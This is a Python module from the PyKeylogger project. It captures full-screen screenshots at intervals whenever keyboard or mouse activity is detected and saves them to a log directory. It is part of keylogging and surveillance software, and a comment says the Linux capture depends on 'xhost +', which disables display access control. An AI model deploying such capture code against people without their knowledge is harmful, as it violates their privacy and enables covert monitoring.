##############################################################################
##
## PyKeylogger: Simple Python Keylogger for Windows
## Copyright (C) 2009  nanotube@users.sf.net
##
## http://pykeylogger.sourceforge.net/
##
## This program is free software; you can redistribute it and/or
## modify it under the terms of the GNU General Public License
## as published by the Free Software Foundation; either version 3
## of the License, or (at your option) any later version.
##
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License for more details.
##
## You should have received a copy of the GNU General Public License
## along with this program.  If not, see <http://www.gnu.org/licenses/>.
##
##############################################################################

from myutils import (_settings, _cmdoptions, OnDemandRotatingFileHandler,
    to_unicode)
from queue import Queue, Empty
from threading import Event
import os
import os.path
import logging
import time
import re
import sys
import datetime

if os.name == 'nt':
    import win32api
    import ImageGrab
elif os.name == 'posix':
    from Xlib import X, XK, display, error
    from Xlib.ext import record
    from Xlib.protocol import rq
    from PIL import Image
else:
    print("OS is not recognised as windows or linux")
    sys.exit()

from baseeventclasses import *

from onclickimagecapture import CropBox, Point
    
class TimedScreenshotFirstStage(FirstStageBaseEventClass):
    '''Takes screenshots at fixed interval.
    
    Only if any user keyboard or mouse activity is detected in between.
    Does not count mouse motion, only clicks.
    
    Sets the secondstage event to notify of activity.
    '''
    
    def __init__(self, *args, **kwargs):
        
        FirstStageBaseEventClass.__init__(self, *args, **kwargs)

        self.task_function = self.process_event
            
    def process_event(self):
        try:
            event = self.q.get(timeout=0.05) #need the timeout so that thread terminates properly when exiting
            self.sst_q.set()
            self.logger.debug("User activity detected")
        except Empty:
            pass #let's keep iterating
        except:
            self.logger.debug("some exception was caught in "
                "the logwriter loop...\nhere it is:\n", exc_info=True)
            pass #let's keep iterating
    
    def spawn_second_stage_thread(self): 
        self.sst_q = Event()
        self.sst = TimedScreenshotSecondStage(self.dir_lock, 
                                                self.sst_q, self.loggername)

class TimedScreenshotSecondStage(SecondStageBaseEventClass):
    def __init__(self, dir_lock, *args, **kwargs):
        SecondStageBaseEventClass.__init__(self, dir_lock, *args, **kwargs)
                
        self.task_function = self.process_event
                
        self.logger = logging.getLogger(self.loggername)
        
        self.sleep_counter = 0

        # Hook to our display.
        if os.name == 'posix':
            self.local_dpy = display.Display()
                    
    def process_event(self):
        try:
            # break up the sleep into short bursts, to allow for quick 
            # and clean exit.
            time.sleep(0.05)
            self.sleep_counter += 0.05
            if self.sleep_counter > self.subsettings['General']['Screenshot Interval']:
                if self.q.isSet():
                    self.logger.debug("capturing timed screenshot...")
                    
                    try:
                        savefilename = os.path.join(\
                                self.settings['General']['Log Directory'],
                                self.subsettings['General']['Log Subdirectory'],
                                self.parse_filename())
                        self.logger.error("SNAP: " + str(savefilename))
                        self.capture_image(savefilename)
                    finally:
                        self.q.clear()
                        self.sleep_counter = 0
                
        except:
            self.logger.debug("some exception was caught in the "
                "screenshot loop...\nhere it is:\n", exc_info=True)
            pass #let's keep iterating

    def capture_image(self, savefilename):
        try:
            screensize = self.get_screen_size()

            # The cropbox will take care of making sure our image is within
            # screen boundaries.
            cropbox = CropBox(topleft=Point(0,0),
                            bottomright=screensize,
                            min=Point(0,0),
                            max=screensize)
            
            self.logger.debug(cropbox)
                    
            if os.name == 'posix':
                AllPlanes = 0xFFFFFFFF
                # JA: we want to capture the entire screen
                # we can't use PIL imagegrab because it's win/mac
                # we can't use gtk because it's out of date
                # so we use PIL get_image instead
                # however, this requires xhost +  because we grab the display using xlib
                cropbox = CropBox(topleft=Point(0,0),
                    bottomright=screensize,
                    min=Point(0,0),
                    max=screensize)
                raw = self.rootwin.get_image(cropbox.topleft.x,
                        cropbox.topleft.y, cropbox.size.x, cropbox.size.y,
                        X.ZPixmap, AllPlanes)
                image_data = Image.frombytes("RGBX", (cropbox.size.x, cropbox.size.y), raw.data, "raw", "BGRX").convert("RGB")

                save_options_dict = {}
                if self.subsettings['General']['Screenshot Image Format'].lower() in ['jpg','jpeg']:
                    self.subsettings['General']['Screenshot Image Format'] = 'jpeg'
                    save_options_dict = {'quality':to_unicode(self.subsettings['General']['Screenshot Image Quality'])}
                
                image_data.save(savefilename, 
                        self.subsettings['General']['Screenshot Image Format'])

            if os.name == 'nt':
                image_data = ImageGrab.grab((cropbox.topleft.x, cropbox.topleft.y, cropbox.bottomright.x, cropbox.bottomright.y))
                image_data.save(savefilename, 
                        quality=self.subsettings['General']['Screenshot Image Quality'])

        except error.BadDrawable:
            self.logger.error("bad drawable when attempting to get an image!  Closed the window?")
        except error.BadMatch:
            self.logger.error("bad match when attempting to get an image! probably specified an area outside the window (too big?)")
        except error.BadValue:
            self.logger.error("getimage: bad value error - tell me about this one, I've not managed to make it happen yet")
        except Exception:
            self.logger.error('Error writing image to file',
                            exc_info=True)

    def get_screen_size(self):
        if os.name == 'posix':
            self.rootwin = \
               self.local_dpy.get_input_focus().focus.query_tree().root
            if self.rootwin == 0:
                self.rootwin = self.local_dpy.get_input_focus()
            return Point(self.rootwin.get_geometry().width,
                         self.rootwin.get_geometry().height)
        if os.name == 'nt':
            return Point(win32api.GetSystemMetrics(0),
                         win32api.GetSystemMetrics(1))

    def parse_filename(self):
        filepattern = self.subsettings['General']['Screenshot Image Filename']
        fileextension = self.subsettings['General']['Screenshot Image Format']

        filepattern = re.sub(r'%time%', 
			str(time.time()), 
            filepattern)
        filepattern = filepattern + '.' + fileextension
        return filepattern
